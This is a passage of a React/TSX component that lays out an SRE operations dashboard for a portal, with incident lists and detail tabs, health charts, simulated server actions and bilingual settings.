                className="w-full pl-10 pr-4 py-2 bg-slate-100 border-transparent rounded-lg text-sm focus:bg-white focus:ring-2 focus:ring-blue-500 transition-all outline-none"
              />
            </div>
          </div>
          
          <div className="flex items-center gap-4">
            <button className="p-2 text-slate-500 hover:bg-slate-100 rounded-full relative transition-colors">
              <Bell className="w-5 h-5" />
              <span className="absolute top-1.5 right-1.5 w-2 h-2 bg-red-500 rounded-full border-2 border-white" />
            </button>
            <Separator orientation="vertical" className="h-6" />
            <div className="flex items-center gap-2">
              <div className="text-right hidden sm:block">
                <p className="text-sm font-semibold">Pedro B.</p>
                <p className="text-xs text-slate-500">Lead SRE</p>
              </div>
              <Avatar className="w-9 h-9 border border-slate-200">
                <AvatarImage src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=80&h=80&fit=crop" />
                <AvatarFallback>PB</AvatarFallback>
              </Avatar>
            </div>
          </div>
        </header>

        {/* Content Area */}
        <div className="flex-1 overflow-hidden flex flex-col">
          {activeTab === 'dashboard' && (
            <ScrollArea className="flex-1">
              <div className="p-8 space-y-8 max-w-7xl mx-auto">
                <motion.div 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="space-y-8"
                >
                  <div className="flex items-center justify-between">
                    <div>
                      <h1 className="text-2xl font-bold tracking-tight">Portal Operations Dashboard</h1>
                      <p className="text-slate-500">Real-time overview of Jardinagem Portal health and active incidents.</p>
                    </div>
                    <Button variant="outline" className="gap-2">
                      <RefreshCw className="w-4 h-4" />
                      Refresh Data
                    </Button>
                  </div>

                  {/* KPI Cards */}
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                    <Card>
                      <CardContent className="pt-6">
                        <div className="flex items-center justify-between mb-2">
                          <p className="text-sm font-medium text-slate-500">Active Incidents</p>
                          <AlertCircle className="w-4 h-4 text-red-500" />
                        </div>
                        <div className="flex items-baseline gap-2">
                          <span className="text-3xl font-bold">12</span>
                          <span className="text-xs font-medium text-red-600">+2 from yesterday</span>
                        </div>
                      </CardContent>
                    </Card>
                    <Card>
                      <CardContent className="pt-6">
                        <div className="flex items-center justify-between mb-2">
                          <p className="text-sm font-medium text-slate-500">Avg. Resolution Time</p>
                          <Activity className="w-4 h-4 text-blue-500" />
                        </div>
                        <div className="flex items-baseline gap-2">
                          <span className="text-3xl font-bold">42m</span>
                          <span className="text-xs font-medium text-green-600">-15% improvement</span>
                        </div>
                      </CardContent>
                    </Card>
                    <Card>
                      <CardContent className="pt-6">
                        <div className="flex items-center justify-between mb-2">
                          <p className="text-sm font-medium text-slate-500">System Health</p>
                          <Server className="w-4 h-4 text-green-500" />
                        </div>
                        <div className="flex items-baseline gap-2">
                          <span className="text-3xl font-bold text-green-600">94%</span>
                          <span className="text-xs font-medium text-slate-400">Stable</span>
                        </div>
                      </CardContent>
                    </Card>
                    <Card>
                      <CardContent className="pt-6">
                        <div className="flex items-center justify-between mb-2">
                          <p className="text-sm font-medium text-slate-500">Deployment Success</p>
                          <CheckCircle2 className="w-4 h-4 text-purple-500" />
                        </div>
                        <div className="flex items-baseline gap-2">
                          <span className="text-3xl font-bold">99.8%</span>
                          <span className="text-xs font-medium text-slate-400">Last 30 days</span>
                        </div>
                      </CardContent>
                    </Card>
                  </div>

                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                    {/* Main Chart */}
                    <Card className="lg:col-span-2">
                      <CardHeader>
                        <CardTitle>Incident Trends & System Health</CardTitle>
                        <CardDescription>24-hour monitoring of operational metrics.</CardDescription>
                      </CardHeader>
                      <CardContent className="h-[300px]">
                        <ResponsiveContainer width="100%" height="100%">
                          <AreaChart data={chartData}>
                            <defs>
                              <linearGradient id="colorIncidents" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#ef4444" stopOpacity={0.1}/>
                                <stop offset="95%" stopColor="#ef4444" stopOpacity={0}/>
                              </linearGradient>
                              <linearGradient id="colorHealth" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.1}/>
                                <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
                              </linearGradient>
                            </defs>
                            <CartesianGrid strokeDasharray="3 3" vertical={false} stroke="#e2e8f0" />
                            <XAxis dataKey="time" axisLine={false} tickLine={false} tick={{ fontSize: 12, fill: '#64748b' }} />
                            <YAxis axisLine={false} tickLine={false} tick={{ fontSize: 12, fill: '#64748b' }} />
                            <RechartsTooltip 
                              contentStyle={{ backgroundColor: '#fff', borderRadius: '8px', border: '1px solid #e2e8f0', boxShadow: '0 4px 6px -1px rgb(0 0 0 / 0.1)' }}
                            />
                            <Area type="monotone" dataKey="incidents" stroke="#ef4444" fillOpacity={1} fill="url(#colorIncidents)" strokeWidth={2} />
                            <Area type="monotone" dataKey="health" stroke="#3b82f6" fillOpacity={1} fill="url(#colorHealth)" strokeWidth={2} />
                          </AreaChart>
                        </ResponsiveContainer>
                      </CardContent>
                    </Card>

                    {/* System Status */}
                    <Card>
                      <CardHeader>
                        <CardTitle>System Status</CardTitle>
                        <CardDescription>Live infrastructure health check.</CardDescription>
                      </CardHeader>
                      <CardContent>
                        <div className="space-y-4">
                          {systemHealth.map((sys) => (
                            <div key={sys.name} className="flex items-center justify-between p-3 rounded-lg bg-slate-50 border border-slate-100">
                              <div className="flex items-center gap-3">
                                {sys.status === 'healthy' ? (
                                  <CheckCircle2 className="w-4 h-4 text-green-500" />
                                ) : sys.status === 'degraded' ? (
                                  <AlertTriangle className="w-4 h-4 text-yellow-500" />
                                ) : (
                                  <XCircle className="w-4 h-4 text-red-500" />
                                )}
                                <div>
                                  <p className="text-sm font-semibold">{sys.name}</p>
                                  <p className="text-xs text-slate-500">{sys.latency}ms latency • {sys.uptime}% uptime</p>
                                </div>
                              </div>
                              <Badge variant="outline" className={cn(
                                "capitalize",
                                sys.status === 'healthy' ? "text-green-600 border-green-200" :
                                sys.status === 'degraded' ? "text-yellow-600 border-yellow-200" :
                                "text-red-600 border-red-200"
                              )}>
                                {sys.status}
                              </Badge>
                            </div>
                          ))}
                        </div>
                      </CardContent>
                    </Card>
                  </div>

                  {/* Recent Incidents Table */}
                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between">
                      <div>
                        <CardTitle>Active Incidents</CardTitle>
                        <CardDescription>ServiceNow-style incident management list.</CardDescription>
                      </div>
                      <Button variant="ghost" className="text-blue-600" onClick={() => setActiveTab('incidents')}>
                        View All <ChevronRight className="w-4 h-4 ml-1" />
                      </Button>
                    </CardHeader>
                    <CardContent>
                      <div className="border rounded-lg overflow-hidden">
                        <table className="w-full text-sm text-left">
                          <thead className="bg-slate-50 border-b text-slate-500 font-medium uppercase text-[10px] tracking-wider">
                            <tr>
                              <th className="px-4 py-3">Number</th>
                              <th className="px-4 py-3">Title</th>
                              <th className="px-4 py-3">Priority</th>
                              <th className="px-4 py-3">Status</th>
                              <th className="px-4 py-3">Assignee</th>
                              <th className="px-4 py-3">Role</th>
                              <th className="px-4 py-3">System</th>
                            </tr>
                          </thead>
                          <tbody className="divide-y">
                            {mockIncidents.slice(0, 10).map((inc) => (
                              <tr 
                                key={inc.id} 
                                className="hover:bg-slate-50 cursor-pointer transition-colors"
                                onClick={() => {
                                  setSelectedIncident(inc);
                                  setActiveTab('incidents');
                                }}
                              >
                                <td className="px-4 py-4 font-mono text-blue-600 font-medium">{inc.id}</td>
                                <td className="px-4 py-4 font-semibold">{inc.title}</td>
                                <td className="px-4 py-4"><PriorityBadge priority={inc.priority} /></td>
                                <td className="px-4 py-4"><StatusBadge status={inc.status} /></td>
                                <td className="px-4 py-4">
                                  <div className="flex items-center gap-2">
                                    <Avatar className="w-6 h-6">
                                      <AvatarFallback>{inc.assignee[0]}</AvatarFallback>
                                    </Avatar>
                                    {inc.assignee}
                                  </div>
                                </td>
                                <td className="px-4 py-4">
                                  <Badge variant="outline" className="text-[10px] font-bold uppercase tracking-wider border-blue-200 text-blue-700 bg-blue-50">
                                    {inc.role}
                                  </Badge>
                                </td>
                                <td className="px-4 py-4 text-slate-500">{inc.system}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    </CardContent>
                  </Card>
                </motion.div>
              </div>
            </ScrollArea>
          )}

          {activeTab === 'incidents' && (
            <div className="p-8 flex-1 overflow-hidden">
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="grid grid-cols-1 lg:grid-cols-12 gap-8 h-full"
              >
                {/* Incident List */}
                <div className="lg:col-span-4 flex flex-col gap-4 overflow-hidden min-h-0 h-full">
                  <div className="flex items-center justify-between shrink-0">
                    <h2 className="text-xl font-bold">Incidents</h2>
                    <Badge variant="secondary">{mockIncidents.length} Total</Badge>
                  </div>
                  <ScrollArea className="flex-1 border rounded-xl bg-white min-h-0">
                    <div className="divide-y">
                      {mockIncidents.map((inc) => (
                        <div 
                          key={inc.id}
                          onClick={() => setSelectedIncident(inc)}
                          className={cn(
                            "p-4 cursor-pointer transition-all hover:bg-slate-50",
                            selectedIncident?.id === inc.id ? "bg-blue-50 border-l-4 border-l-blue-600" : "border-l-4 border-l-transparent"
                          )}
                        >
                          <div className="flex justify-between items-start mb-2">
                            <div className="flex flex-col gap-1">
                              <span className="text-xs font-mono text-slate-500">{inc.id}</span>
                              <span className="text-[10px] font-bold uppercase text-blue-600">{inc.role}</span>
                            </div>
                            <PriorityBadge priority={inc.priority} />
                          </div>
                          <h3 className="font-bold text-sm mb-1 line-clamp-2">{inc.title}</h3>
                          <div className="flex items-center justify-between mt-3">
                            <StatusBadge status={inc.status} />
                            <span className="text-xs text-slate-400">2h ago</span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </ScrollArea>
                </div>

                {/* Incident Detail */}
                <div className="lg:col-span-8 flex flex-col gap-6 overflow-hidden bg-yellow-400/10 p-6 rounded-3xl border-2 border-yellow-400/20">
                  {selectedIncident ? (
                    <AnimatePresence mode="wait">
                      <motion.div 
                        key={selectedIncident.id}
                        initial={{ opacity: 0, x: 20 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: -20 }}
                        className="flex flex-col h-full gap-6"
                      >
                        {/* Detail Header */}
                        <Card className="shrink-0 border-yellow-200 bg-white/80 backdrop-blur-sm shadow-yellow-100 shadow-lg">
                          <CardContent className="p-6">
                            <div className="flex justify-between items-start mb-4">
                              <div>
                                <div className="flex items-center gap-3 mb-2">
                                  <span className="text-sm font-mono text-yellow-700 font-bold">{selectedIncident.id}</span>
                                  <Badge variant="outline" className="text-[10px] font-bold uppercase tracking-wider border-yellow-300 text-yellow-800 bg-yellow-50">
                                    {selectedIncident.role}
                                  </Badge>
                                  <PriorityBadge priority={selectedIncident.priority} />
                                  <StatusBadge status={selectedIncident.status} />
                                </div>
                                <h1 className="text-2xl font-bold text-slate-900">{selectedIncident.title}</h1>
                              </div>
                              <div className="flex gap-2">
                                <Button variant="outline" className="border-yellow-200 hover:bg-yellow-50">Assign to Me</Button>
                                <Button className="bg-yellow-500 hover:bg-yellow-600 text-slate-900 font-bold">Resolve</Button>
                              </div>
                            </div>
                            <div className="grid grid-cols-3 gap-8 pt-4 border-t border-yellow-100">
                              <div>
                                <p className="text-xs text-yellow-700 uppercase font-bold tracking-wider mb-1">Assignee</p>
                                <div className="flex items-center gap-2">
                                  <Avatar className="w-6 h-6 border-yellow-200">
                                    <AvatarFallback className="bg-yellow-100 text-yellow-700">{selectedIncident.assignee[0]}</AvatarFallback>
                                  </Avatar>
                                  <span className="text-sm font-medium">{selectedIncident.assignee}</span>
                                </div>
                              </div>
                              <div>
                                <p className="text-xs text-yellow-700 uppercase font-bold tracking-wider mb-1">System Context</p>
                                <div className="flex items-center gap-2">
                                  <Cloud className="w-4 h-4 text-yellow-600" />
                                  <span className="text-sm font-medium">{selectedIncident.system}</span>
                                </div>
                              </div>
                              <div>
                                <p className="text-xs text-yellow-700 uppercase font-bold tracking-wider mb-1">Created At</p>
                                <span className="text-sm font-medium">{new Date(selectedIncident.createdAt).toLocaleString()}</span>
                              </div>
                            </div>
                          </CardContent>
                        </Card>

                        {/* Detail Tabs */}
                        <Tabs defaultValue="timeline" className="flex-1 flex flex-col min-h-0">
                          <TabsList className="bg-yellow-100/50 p-1 w-fit border border-yellow-200">
                            <TabsTrigger value="timeline" className="data-[state=active]:bg-yellow-500 data-[state=active]:text-slate-900">Timeline</TabsTrigger>
                            <TabsTrigger value="logs" className="data-[state=active]:bg-yellow-500 data-[state=active]:text-slate-900">Technical Logs</TabsTrigger>
                            <TabsTrigger value="actions" className="data-[state=active]:bg-yellow-500 data-[state=active]:text-slate-900">Action Panel</TabsTrigger>
                            <TabsTrigger value="infrastructure" className="data-[state=active]:bg-yellow-500 data-[state=active]:text-slate-900">Infrastructure</TabsTrigger>
                          </TabsList>
                          
                          <div className="flex-1 mt-4 min-h-0">
                            <TabsContent value="timeline" className="h-full m-0">
                              <Card className="h-full border-yellow-100 bg-white/80">
                                <ScrollArea className="h-full p-6">
                                  <div className="relative space-y-8 before:absolute before:inset-0 before:ml-5 before:-translate-x-px before:h-full before:w-0.5 before:bg-gradient-to-b before:from-transparent before:via-yellow-200 before:to-transparent">
                                    {selectedIncident.timeline.map((event, i) => (
                                      <div key={event.id} className="relative flex items-start gap-6 group">
                                        <div className="absolute left-0 mt-1.5 w-10 h-10 rounded-full bg-white border-2 border-yellow-200 flex items-center justify-center z-10 group-hover:border-yellow-500 transition-colors shadow-sm">
                                          <div className="w-2 h-2 rounded-full bg-yellow-400 group-hover:bg-yellow-600 transition-colors" />
                                        </div>
                                        <div className="ml-12">
                                          <time className="text-xs font-mono text-yellow-700">{event.timestamp}</time>
                                          <h4 className="font-bold text-slate-900">{event.action}</h4>
                                          <p className="text-sm text-slate-500 mt-1">by <span className="font-medium text-slate-700">{event.user}</span></p>
                                          {event.details && (
                                            <div className="mt-2 p-3 bg-yellow-50/50 rounded-lg border border-yellow-100 text-sm text-slate-600">
                                              {event.details}
                                            </div>
                                          )}
                                        </div>
                                      </div>
                                    ))}
                                  </div>
                                </ScrollArea>
                              </Card>
                            </TabsContent>

                            <TabsContent value="logs" className="h-full m-0">
                              <Card className="h-full bg-slate-950 border-slate-800">
                                <ScrollArea className="h-full p-4">
                                  <div className="font-mono text-xs space-y-2">
                                    {selectedIncident.logs.map((log, i) => (
                                      <div key={i} className="flex gap-4 group">
                                        <span className="text-slate-600 shrink-0">{log.timestamp}</span>
                                        <span className={cn(
                                          "font-bold uppercase w-12 shrink-0",
                                          log.level === 'error' ? "text-red-500" : log.level === 'warn' ? "text-yellow-500" : "text-blue-500"
                                        )}>[{log.level}]</span>
                                        <span className="text-slate-300 group-hover:text-white transition-colors">{log.message}</span>
                                      </div>
                                    ))}
                                    <div className="pt-4 border-t border-slate-800 text-slate-500 italic">
                                      End of log stream. Listening for new events...
                                    </div>
                                  </div>
                                </ScrollArea>
                              </Card>
                            </TabsContent>

                            <TabsContent value="actions" className="h-full m-0">
                              <Card className="h-full">
                                <ScrollArea className="h-full">
                                  <CardContent className="p-6">
                                    <div className="grid grid-cols-2 gap-4">
                                      <div className="space-y-4">
                                        <h3 className="text-sm font-bold text-slate-500 uppercase tracking-wider">Server Operations</h3>
                                        <Button onClick={() => handleAction('Restart Apache Server')} variant="outline" className="w-full justify-start gap-3 h-12">
                                          <RefreshCw className="w-4 h-4 text-blue-500" />
                                          Restart Apache Server
                                        </Button>
                                        <Button onClick={() => handleAction('Flush Redis Cache')} variant="outline" className="w-full justify-start gap-3 h-12">
                                          <Database className="w-4 h-4 text-orange-500" />
                                          Flush Redis Cache
                                        </Button>
                                        <Button onClick={() => handleAction('Rotate SSL Certificates')} variant="outline" className="w-full justify-start gap-3 h-12">
                                          <Settings className="w-4 h-4 text-purple-500" />
                                          Rotate SSL Certificates
                                        </Button>
                                      </div>
                                      <div className="space-y-4">
                                        <h3 className="text-sm font-bold text-slate-500 uppercase tracking-wider">Cloud & Network</h3>
                                        <Button onClick={() => handleAction('Create AWS EC2 Instance')} variant="outline" className="w-full justify-start gap-3 h-12">
                                          <Cloud className="w-4 h-4 text-blue-400" />
                                          Create AWS EC2 Instance
                                        </Button>
                                        <Button onClick={() => handleAction('Run API Test Suite')} variant="outline" className="w-full justify-start gap-3 h-12">
                                          <Play className="w-4 h-4 text-green-500" />
                                          Run API Test Suite
                                        </Button>
                                        <Button onClick={() => handleAction('Check Network Connectivity')} variant="outline" className="w-full justify-start gap-3 h-12">
                                          <Network className="w-4 h-4 text-slate-500" />
                                          Check Network Connectivity
                                        </Button>
                                      </div>
                                    </div>
                                    
                                    <div className="mt-8">
                                      <h3 className="text-sm font-bold text-slate-500 uppercase tracking-wider mb-4">Live Execution Console</h3>
                                      <div className="h-48">
                                        <Terminal logs={terminalLogs} />
                                      </div>
                                    </div>
                                  </CardContent>
                                </ScrollArea>
                              </Card>
                            </TabsContent>

                            <TabsContent value="infrastructure" className="h-full m-0">
                              <ScrollArea className="h-full">
                                <div className="p-4">
                                  <InfrastructureView isApacheRunning={isApacheRunning} />
                                </div>
                              </ScrollArea>
                            </TabsContent>
                          </div>
                        </Tabs>
                      </motion.div>
                    </AnimatePresence>
                  ) : (
                    <div className="flex-1 flex items-center justify-center text-slate-400 flex-col gap-4">
                      <AlertCircle className="w-12 h-12 opacity-20" />
                      <p>Select an incident to view details</p>
                    </div>
                  )}
                </div>
              </motion.div>
            </div>
          )}

          {activeTab === 'infrastructure' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
              >
                <InfrastructureView isApacheRunning={isApacheRunning} />
              </motion.div>
            </div>
          )}

          {activeTab === 'database' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <DatabaseView />
              </motion.div>
            </div>
          )}

          {activeTab === 'terminal' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <LinuxTerminal />
              </motion.div>
            </div>
          )}

          {activeTab === 'tools' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <ToolsView 
                  isApacheRunning={isApacheRunning} 
                  setIsApacheRunning={setIsApacheRunning} 
                  addLog={addLog}
                />
              </motion.div>
            </div>
          )}

          {activeTab === 'office365' && (
            <div className="p-8 flex-1 flex flex-col min-h-0">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <Office365View />
              </motion.div>
            </div>
          )}

          {activeTab === 'cybersecurity' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <CybersecurityView />
              </motion.div>
            </div>
          )}

          {activeTab === 'chat' && (
            <div className="p-8 flex-1 flex flex-col min-h-0">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <ChatView />
              </motion.div>
            </div>
          )}

          {activeTab === 'tutorials' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <TutorialsView />
              </motion.div>
            </div>
          )}

          {activeTab === 'calendar' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <CalendarView />
              </motion.div>
            </div>
          )}

          {activeTab === 'ai' && (
            <div className="p-8 flex-1 flex flex-col min-h-0">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <AIView />
              </motion.div>
            </div>
          )}

          {activeTab === 'portal' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                {isApacheRunning ? (
                  <PortalView />
                ) : (
                  <div className="h-full flex flex-col items-center justify-center text-center space-y-6 bg-white rounded-3xl border-2 border-dashed border-slate-200">
                    <div className="w-24 h-24 bg-red-50 rounded-full flex items-center justify-center">
                      <XCircle className="w-12 h-12 text-red-500" />
                    </div>
                    <div>
                      <h2 className="text-2xl font-black text-slate-900">503 Service Unavailable</h2>
                      <p className="text-slate-500 mt-2">The Apache HTTP Server is currently stopped.</p>
                    </div>
                    <Button 
                      onClick={() => setActiveTab('tools')}
                      className="bg-slate-900 hover:bg-blue-600 text-white rounded-xl"
                    >
                      Go to Tools to Start Apache
                    </Button>
                  </div>
                )}
              </motion.div>
            </div>
          )}

          {activeTab === 'oracle' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <OracleView />
              </motion.div>
            </div>
          )}

          {activeTab === 'edi' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="h-full"
              >
                <EDIIntegrationView />
              </motion.div>
            </div>
          )}

          {activeTab === 'settings' && (
            <div className="p-8 flex-1 overflow-y-auto custom-scrollbar">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="max-w-2xl"
              >
                <h1 className="text-2xl font-bold mb-6">{language === 'pt' ? 'Configurações' : 'Settings'}</h1>
                
                <Card>
                  <CardHeader>
                    <CardTitle>{language === 'pt' ? 'Aparência' : 'Appearance'}</CardTitle>
                    <CardDescription>{language === 'pt' ? 'Personalize o visual do seu centro de operações.' : 'Customize the look and feel of your operations center.'}</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    <div className="space-y-3">
                      <label className="text-sm font-medium">{language === 'pt' ? 'Fundo do Dashboard' : 'Dashboard Background'}</label>
                      <div className="grid grid-cols-4 gap-4">
                        {[
                          { id: 'slate', label: language === 'pt' ? 'Ardósia' : 'Slate', color: 'bg-slate-100' },
                          { id: 'zinc', label: language === 'pt' ? 'Zinco' : 'Zinc', color: 'bg-zinc-100' },
                          { id: 'blue', label: language === 'pt' ? 'Azul Suave' : 'Soft Blue', color: 'bg-blue-100' },
                          { id: 'dark', label: language === 'pt' ? 'Meia-noite' : 'Midnight', color: 'bg-slate-800' },
                          { id: 'emerald', label: language === 'pt' ? 'Esmeralda' : 'Emerald', color: 'bg-emerald-100' },
                          { id: 'rose', label: language === 'pt' ? 'Rosa' : 'Rose', color: 'bg-rose-100' },
                          { id: 'amber', label: language === 'pt' ? 'Âmbar' : 'Amber', color: 'bg-amber-100' },
                          { id: 'indigo', label: language === 'pt' ? 'Índigo' : 'Indigo', color: 'bg-indigo-100' },
                        ].map((theme) => (
                          <button
                            key={theme.id}
                            onClick={() => setBgTheme(theme.id as any)}
                            className={cn(
                              "flex flex-col items-center gap-2 p-3 rounded-xl border-2 transition-all",
                              bgTheme === theme.id ? "border-blue-600 bg-blue-50/50" : "border-transparent hover:bg-slate-100"
                            )}
                          >
                            <div className={cn("w-full h-12 rounded-lg shadow-sm", theme.color)} />
                            <span className="text-xs font-medium">{theme.label}</span>
                          </button>
                        ))}
                      </div>
                    </div>

                    <Separator />

                    <div className="space-y-3">
                      <label className="text-sm font-medium">{language === 'pt' ? 'Idioma da Aplicação' : 'Application Language'}</label>
                      <div className="flex gap-4">
                        {[
                          { id: 'pt', label: 'Português', flag: '🇧🇷' },
                          { id: 'en', label: 'English', flag: '🇺🇸' },
                        ].map((lang) => (
                          <button
                            key={lang.id}
                            onClick={() => setLanguage(lang.id as any)}
                            className={cn(
                              "flex-1 flex items-center justify-center gap-2 p-3 rounded-xl border-2 transition-all",
                              language === lang.id ? "border-blue-600 bg-blue-50/50" : "border-slate-200 hover:bg-slate-100"
                            )}
                          >
                            <span className="text-xl">{lang.flag}</span>
                            <span className="text-sm font-bold">{lang.label}</span>
                          </button>
                        ))}
                      </div>
                    </div>

                    <Separator />

                    <div className="flex items-center justify-between">
                      <div className="space-y-0.5">
                        <p className="text-sm font-medium">{language === 'pt' ? 'Modo Compacto' : 'Compact Mode'}</p>
                        <p className="text-xs text-slate-500">{language === 'pt' ? 'Reduzir espaçamento e tamanhos de fonte.' : 'Reduce padding and font sizes for high-density views.'}</p>
                      </div>
                      <div className="w-10 h-5 bg-slate-200 rounded-full relative cursor-not-allowed opacity-50">
                        <div className="absolute left-1 top-1 w-3 h-3 bg-white rounded-full" />
                      </div>
                    </div>

                    <div className="flex items-center justify-between">
                      <div className="space-y-0.5">
                        <p className="text-sm font-medium">{language === 'pt' ? 'Atualizações em Tempo Real' : 'Real-time Updates'}</p>
                        <p className="text-xs text-slate-500">{language === 'pt' ? 'Atualizar métricas automaticamente a cada 5 segundos.' : 'Automatically refresh metrics every 5 seconds.'}</p>
                      </div>
                      <div className="w-10 h-5 bg-blue-600 rounded-full relative cursor-pointer">
                        <div className="absolute right-1 top-1 w-3 h-3 bg-white rounded-full" />
                      </div>
                    </div>
                  </CardContent>
                </Card>

                <Card className="mt-8 border-red-100">
                  <CardHeader>
                    <CardTitle className="text-red-600">{language === 'pt' ? 'Zona de Perigo' : 'Danger Zone'}</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <Button variant="destructive" className="w-full">{language === 'pt' ? 'Resetar Todos os Dados do Sistema' : 'Reset All System Data'}</Button>
                  </CardContent>
                </Card>
              </motion.div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
